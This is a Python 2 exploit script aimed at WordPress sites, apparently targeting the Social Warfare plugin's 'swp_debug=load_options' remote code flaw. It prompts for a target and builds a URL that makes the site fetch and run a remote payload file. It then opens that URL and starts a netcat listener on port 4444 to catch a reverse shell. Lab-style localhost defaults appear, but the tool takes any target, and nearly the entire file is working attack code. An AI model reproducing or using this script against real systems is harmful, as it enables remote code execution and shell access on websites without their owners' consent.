import subprocess
import webbrowser


def foo():

    # Starting point
    print("Hello chief! Do you want to exploit this vulnerability? [y/n]")

    yes = {'yes', 'y'}
    no = {'no', 'n'}
    choice = raw_input().lower()
    if choice in yes:

        print("Seems about right. Remember to prompt \"exit\" twice when you are done.")
        back_ip = "127.0.0.1"
        print("Target website will connect back to " + back_ip)

        port = 4444
        print("Port " + str(port) + " will be used.")

        # Composing URLs, listening for connections and connecting to target
        listen(str(port))

        print("Connection closed.")
        return True

    elif choice in no:
        print("Understandable. Have a nice day.")
        return False
    else:
        print("Please respond with 'yes' or 'no'. Bye.")


def listen(port):
    print("Input the \"IP:port\" or the domain name of the target site. "
          "Hit enter to use testing configuration (localhost:8888):")
    target_ip = raw_input()
    connect_to_target(target_ip, port)


def connect_to_target(target_ip, port):
    payload_path = "localhost:8888/PenTest/payload.txt"
    if target_ip == "":
        target_ip = "localhost:8888"
        target_url = "http://{0}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{1}".format(
            target_ip, payload_path)
    else:
        target_url = "http://{0}/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{1}".format(
            target_ip, payload_path)

    print(target_url)

    print("Connecting to target...")
    webbrowser.open(target_url, new=0, autoraise=False)
    subprocess.check_call(["nc", "-l", port])


foo()
